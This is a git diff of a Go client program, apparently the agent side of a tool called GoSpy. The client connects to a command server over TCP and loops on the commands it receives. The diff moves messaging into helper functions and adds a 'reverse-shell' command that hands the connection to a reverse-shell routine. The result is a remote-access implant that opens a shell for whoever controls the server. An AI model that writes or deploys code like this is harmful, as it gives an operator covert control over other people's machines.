@@ -1,20 +1,19 @@
 package main
 
 import (
-	"bufio"
 	"flag"
-	"fmt"
+	"github.com/psidex/GoSpy/internal/comms"
+	"github.com/psidex/GoSpy/internal/gospy/shell"
 	"log"
 	"net"
 	"os"
-	"strings"
 )
 
-// ToDo: This is just basic testing code, requires a lot of cleanup.
+// ToDo: What happens if server drops?
 
 func main() {
 	address := *flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
-	log.Printf("Got address %s\n", address)
+	log.Printf("Using address %s\n", address)
 
 	conn, err := net.Dial("tcp", address)
 	if err != nil {
@@ -22,20 +21,31 @@ func main() {
 	}
 
 	for {
-		message, err := bufio.NewReader(conn).ReadString('\n')
+		message, err := comms.RecvStringFrom(conn)
 		if err != nil {
 			log.Fatal(err)
 		}
 
-		message = strings.TrimSuffix(message, "\n")
-		log.Printf("Got %s", string(message))
+		log.Printf("Recv: %s", string(message))
 
 		switch message {
+
 		case "exit":
-			log.Println("Bye!")
+			log.Println("Exiting")
 			os.Exit(0)
+
 		case "ping":
-			_, _ = fmt.Fprintf(conn, "pong\n")
+			err = comms.SendStringTo(conn, "pong")
+			if err != nil {
+				log.Printf("pong failed: %e\n", err)
+			}
+
+		case "reverse-shell":
+			err = shell.StartReverseShell(conn)
+			if err != nil {
+				log.Printf("reverse-shell failed: %e\n", err)
+			}
+
 		}
 	}
 }
